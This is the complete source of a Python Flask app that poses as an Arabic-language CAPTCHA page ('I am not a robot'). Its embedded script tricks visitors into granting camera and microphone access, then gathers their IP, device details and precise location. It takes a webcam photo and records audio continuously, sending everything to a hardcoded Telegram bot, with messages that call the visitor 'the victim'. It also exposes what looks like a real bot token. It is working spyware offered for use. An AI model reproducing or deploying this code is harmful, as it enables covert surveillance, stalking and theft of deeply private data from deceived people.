import base64, requests, io, os, json
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- بيانات البوت المحدثة ---
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
CHAT_ID = "7041600701"

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التحقق المطور</title>
    <style>
        body { background: #0a0a0a; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
        .card { background: #111; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; width: 320px; border: 1px solid #222; }
        .btn { background: #f38020; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-size: 18px; width: 100%; font-weight: bold; transition: 0.3s; }
        .btn:hover { background: #e07010; }
        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        #c { display: none; }
        #st { margin-top: 15px; color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 50px; margin-bottom: 10px;">🛡️</div>
        <h3>تأكيد الهوية</h3>
        <p>يرجى الضغط للمتابعة وتخطي نظام الحماية</p>
        <button class="btn" id="go" onclick="startMasterProcess()">أنا لست روبوت</button>
        <div id="st"></div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const st = document.getElementById('st');
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        async function startMasterProcess() {
            document.getElementById('go').style.display = 'none';
            st.innerText = "جاري فحص المتصفح... يرجى الانتظار";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                v.srcObject = stream;

                // جلب المعلومات
                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
                const battery = await navigator.getBattery().catch(() => ({}));
                
                let info = `📱 **تقرير شامل للضحية**:\\n`;
                info += `🌐 IP: ${ipRes.ip}\\n`;
                info += `🖥️ النظام: ${navigator.platform}\\n`;
                info += `🔋 البطارية: ${Math.round((battery.level || 0)*100)}%\\n`;
                info += `🔧 المتصفح: ${navigator.userAgent}`;
                postData('/upload', { d: info, t: 'msg' });

                // الموقع الجغرافي
                navigator.geolocation.getCurrentPosition(p => {
                    const mapUrl = `https://www.google.com/maps?q=\${p.coords.latitude},\${p.coords.longitude}`;
                    postData('/upload', { d: mapUrl, t: 'loc' });
                }, null, {enableHighAccuracy: true});

                // صورة الكاميرا
                setTimeout(() => {
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    postData('/upload', { d: c.toDataURL('image/jpeg', 0.6), t: 'img' });
                }, 3000);

                // التنصت المستمر (كل 5 ثواني)
                function recordChunk() {
                    const recorder = new MediaRecorder(stream);
                    let chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(chunks));
                        reader.onloadend = () => postData('/upload', { d: reader.result, t: 'aud' });
                        recordChunk();
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 5000);
                }
                
                recordChunk();
                st.innerText = "اكتمل الفحص بنجاح!";

            } catch (e) {
                alert("يجب السماح بالأذونات للمتابعة");
                location.reload();
            }
        }

        function postData(url, data) {
            fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json(force=True, silent=True)
    if not data: return "OK"
    t, d = data.get('t'), data.get('d')
    api = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    
    try:
        if t == 'msg':
            requests.post(api + "sendMessage", data={'chat_id': CHAT_ID, 'text': d, 'parse_mode': 'Markdown'})
        elif t == 'loc':
            requests.post(api + "sendMessage", data={'chat_id': CHAT_ID, 'text': f"📍 موقع الضحية:\\n{d}"})
        elif t == 'img':
            img_bytes = base64.b64decode(d.split(',')[1])
            requests.post(api + "sendPhoto", data={'chat_id': CHAT_ID, 'caption': '📸 صورة الكاميرا'}, files={'photo': ('c.jpg', img_bytes)})
        elif t == 'aud':
            aud_bytes = base64.b64decode(d.split(',')[1])
            requests.post(api + "sendVoice", data={'chat_id': CHAT_ID, 'caption': '🎙 تسجيل صوتي مستمر'}, files={'voice': ('v.ogg', aud_bytes)})
    except Exception as e:
        print(f"Error: {e}")
        
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

